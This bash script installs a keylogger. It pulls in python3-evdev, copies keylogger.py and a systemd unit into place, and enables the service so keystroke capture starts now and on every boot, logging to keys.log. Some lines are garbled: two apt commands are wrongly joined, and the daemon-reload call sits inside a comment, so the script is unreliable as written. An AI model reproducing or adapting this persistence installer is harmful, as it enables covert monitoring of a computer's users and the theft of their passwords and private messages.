#!/usr/bin/env bash
set -e

# Install dependencies
apt update\ apt install -y python3-evdev

# Copy script and service
cp keylogger.py /home/hp/g/keylogger.py
chmod +x /home/hp/g/keylogger.py
cp keylogger.service /etc/systemd/system/keylogger.service

# Enable and start service\ n\ systemctl daemon-reload
systemctl enable keylogger.service
systemctl start keylogger.service

echo "Keylogger installed and running. Logs at /home/hp/g/keys.log"